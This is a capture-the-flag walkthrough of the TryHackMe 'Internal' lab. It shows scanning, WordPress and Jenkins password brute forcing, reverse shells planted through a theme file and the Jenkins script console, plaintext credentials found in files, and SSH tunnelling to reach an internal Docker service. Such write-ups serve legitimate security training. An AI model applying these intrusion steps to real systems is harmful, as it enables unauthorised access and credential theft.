An external and internal pentesting lab, featuring SSH Tunneling

IP Enumeration:
```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ nmap 10.10.200.223 > open_ports.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ cat open_ports.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 14:37 IST
Nmap scan report for 10.10.200.223
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.43 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ nmap -sCV -O -Pn -p22,80 10.10.200.223 > ports_scan.txt    
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ cat ports_scan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 14:38 IST
Nmap scan report for 10.10.200.223
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.81 seconds
```

As usual, port 22 (SSH) and port 80 (HTTP).

A normal Apache page is hosted when visiting the IP on the web. Upon Fuzzing, we do get some pages.

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ ffuf -u http://10.10.200.223/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

blog                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 412ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 412ms]
phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 418ms]
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 412ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 423ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 418ms]
```

So, it is known that WordPress is used by the site. We can use wpscan to find any vulnerabilities with this one.

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ wpscan --url http://internal.thm/wordpress -e

...
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)

```

We know a user for the site, admin.

Using wpscan, we can find the admin password as well.

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt 


...
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

With this, we login to the wordpress page where we can add our reverse PHP code to gain shell.

<img src=https://github.com/user-attachments/assets/d80d05f6-50c4-45ee-9c74-8532b15eb856>

I added this to the 404.php page.

The 404.php can be accessed with the following URL: `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.200.223] 50418
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:54:53 up 48 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Upon searching the among the files, I came across the config file, from which I got the MySQL database username and password.

```
www-data@internal:/var/www/html/wordpress$ ls
index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
license.txt      wp-comments-post.php  wp-includes        wp-settings.php
readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php
wp-admin         wp-content            wp-login.php       xmlrpc.php

<cwp-config.php>
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

```
www-data@internal:/var/www/html/wordpress$ mysql -u wordpress -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4127
```

Although this leads to nowhere, but this is a finding that the username and password are hardcoded.

Next thing to look is the 'opt' directory, which in this case do give us information.

```
www-data@internal:/opt$ ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

There are 2 ways to login to this user. Either switching user with the command `su aubreanna` or using SSH to login to the user, which is better as the reverse shell is slow and laggy.

I used SSH to login to the user Aubreanna.

```
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

The IP address 172.17.0.2, is of the docker running on the server. It can be confirmed by using the `ifconfig` command.

So now somehow we have to connect to this Docker machine. This is where SSH Tunneling comes into play. SSH tunneling is used to privately transfer data over an unsafe network. So what is
being done here is that I am hosting the Jekins service hosted on the docker port 8080 on my machine as localhost at port 8080 (any port could have been used).

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.200.223
aubreanna@10.10.200.223's password: 
```

This is how SSH Tunneling is done.

<img src=https://github.com/user-attachments/assets/beb32124-5d81-4bdb-877e-15d81fc9a9c7>

This screenshot confirms that the Jenkins can be accessed at my machine. Also, I tried to fuzz the service to find for anything interesting.

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 335


assets                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 620ms]
favicon.ico             [Status: 200, Size: 17542, Words: 345, Lines: 2, Duration: 437ms]
git                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 574ms]
login                   [Status: 200, Size: 2005, Words: 198, Lines: 11, Duration: 612ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 484ms]
robots.txt              [Status: 200, Size: 71, Words: 11, Lines: 3, Duration: 622ms]
:: Progress: [4614/4614] :: Job [1/1] :: 69 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
```

Now, to find the admin password, I used Caido and not Burp Suite as Caido is faster than Burp Suite is brute forcing (even the free version, is very fast).

<img src=https://github.com/user-attachments/assets/e35bae99-cfe3-48b8-b2cb-f64f771639a0>

With the username and password, I logged in to the service

<img src=https://github.com/user-attachments/assets/966c747f-9190-4ce0-9cba-9f2379aa3d81>

Next, I manually checked the options, and there is an option "Script Console". I find this similar as the PHP reverse shell which we used in the WordPress. But here we have to user Groovy Scripts.
Reverse Shell scripts for this can be easily found on the net.

<img src=https://github.com/user-attachments/assets/d14e4041-e4d6-44d4-8c9f-52f0e3a3cb87>

And here we get the shell:

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ nc -nlvp 4444                                          
listening on [any] 4444 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.200.223] 41214
whoami
jenkins
```

Manually checking a few directories like var, opt. In the opt directory, we find a note:

```
jenkins@jenkins:/opt$ ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

And these credentials can again be used with SSH to login as the root user and read the flag.
